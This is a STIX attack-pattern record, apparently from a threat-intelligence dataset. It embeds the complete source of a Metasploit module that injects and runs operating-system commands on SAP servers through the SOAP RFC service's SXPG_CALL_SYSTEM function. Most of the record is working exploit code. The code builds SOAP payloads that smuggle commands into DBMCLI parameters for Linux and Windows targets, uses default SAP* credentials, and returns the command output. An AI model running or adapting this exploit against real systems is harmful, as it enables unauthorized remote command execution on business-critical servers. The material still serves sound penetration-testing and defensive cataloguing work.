{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--369c53c1-ac0e-47ad-ba85-9d37ebcb8c0c",
    "created": "2024-08-14T16:27:01.276013Z",
    "modified": "2024-08-14T16:27:01.276017Z",
    "name": "SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection",
    "description": " This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the use of the /sap/bc/soap/rfc SOAP service, to inject and execute OS commands.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec.rb",
            "external_id": "sap_soap_rfc_dbmcli_sxpg_call_system_command_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/archive/sap-parameter-injection/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection',\n      'Description' => %q{\n          This module makes use of the SXPG_CALL_SYSTEM Remote Function Call, through the\n        use of the /sap/bc/soap/rfc SOAP service, to inject and execute OS commands.\n      },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ],\n          [ 'URL', 'https://labs.f-secure.com/archive/sap-parameter-injection/' ]\n        ],\n      'Author' =>\n        [\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n      )\n    register_options(\n      [\n        OptString.new('CLIENT', [true, 'SAP Client', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992']),\n        OptEnum.new('OS', [true, 'Target OS', \"linux\", ['linux','windows']]),\n        OptString.new('CMD', [true, 'Command to run', \"id\"])\n      ])\n  end\n\n  def run_host(ip)\n    payload = create_payload(1)\n    exec_command(ip,payload)\n    payload = create_payload(2)\n    exec_command(ip,payload)\n  end\n\n  def create_payload(num)\n    command = \"\"\n    os = \"ANYOS\"\n    if datastore['OS'].downcase == \"linux\"\n      if num == 1\n        command = \"-o /tmp/pwned.txt -n pwnie\" + \"\\n!\"\n        command << datastore['CMD'].gsub(\" \",\"\\t\")\n        command << \"\\n\"\n      end\n      command = \"-ic /tmp/pwned.txt\" if num == 2\n    elsif datastore['OS'].downcase == \"windows\"\n      if num == 1\n        command = '-o c:\\\\\\pwn.out -n pwnsap' + \"\\r\\n!\"\n        space = \"%programfiles:~10,1%\"\n        command << datastore['CMD'].gsub(\" \",space)\n      end\n      command = '-ic c:\\\\\\pwn.out' if num == 2\n    end\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>' + \"\\r\\n\"\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">' + \"\\r\\n\"\n    data << '<env:Body>' + \"\\r\\n\"\n    data << '<n1:SXPG_CALL_SYSTEM xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">' + \"\\r\\n\"\n    data << '<ADDITIONAL_PARAMETERS>' + command + ' </ADDITIONAL_PARAMETERS>' + \"\\r\\n\"\n    data << '<COMMANDNAME>DBMCLI</COMMANDNAME>' + \"\\r\\n\"\n    data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>' + \"\\r\\n\"\n    data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>' + \"\\r\\n\"\n    data << '</n1:SXPG_CALL_SYSTEM>' + \"\\r\\n\"\n    data << '</env:Body>' + \"\\r\\n\"\n    data << '</env:Envelope>' + \"\\r\\n\"\n    return data\n  end\n\n  def exec_command(ip,data)\n    print_status(\"[SAP] #{ip}:#{rport} - sending SOAP SXPG_CALL_SYSTEM request\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'ctype' => 'text/xml; charset=UTF-8',\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'encode_params' => false,\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code != 500 and res.code != 200\n        print_error(\"[SAP] #{ip}:#{rport} - something went wrong!\")\n        return\n      elsif res and res.body =~ /faultstring/\n        error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten\n        0.upto(output.length-1) do |i|\n          print_error(\"[SAP] #{ip}:#{rport} - error #{error[i]}\")\n        end\n        return\n      elsif res\n        print_status(\"[SAP] #{ip}:#{rport} - got response\")\n        output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten\n        result = []\n        0.upto(output.length-1) do |i|\n          if output[i] =~ /E[rR][rR]/ || output[i] =~ /---/ || output[i] =~ /for database \\(/\n            #nothing\n          elsif output[i] =~ /unknown host/ || output[i] =~ /; \\(see/ || output[i] =~ /returned with/\n            #nothing\n          elsif output[i] =~ /External program terminated with exit code/\n            #nothing\n          else\n            temp = output[i].gsub(\"&#62\",\">\")\n            temp_ = temp.gsub(\"&#34\",\"\\\"\")\n            temp__ = temp_.gsub(\"&#39\",\"'\")\n            result << temp__ + \"\\n\"\n          end\n        end\n        saptbl = Msf::Ui::Console::Table.new(\n          Msf::Ui::Console::Table::Style::Default,\n          'Header'  => \"[SAP] SXPG_CALL_SYSTEM dbmcli Command Injection\",\n          'Prefix'  => \"\\n\",\n          'Postfix' => \"\\n\",\n          'Indent'  => 1,\n          'Columns' =>[\"Output\"]\n          )\n        for i in 0..result.length/2-1\n          saptbl << [result[i].chomp]\n        end\n        print (saptbl.to_s)\n        return\n      else\n        print_error(\"[SAP] #{ip}:#{rport} - Unknown error\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}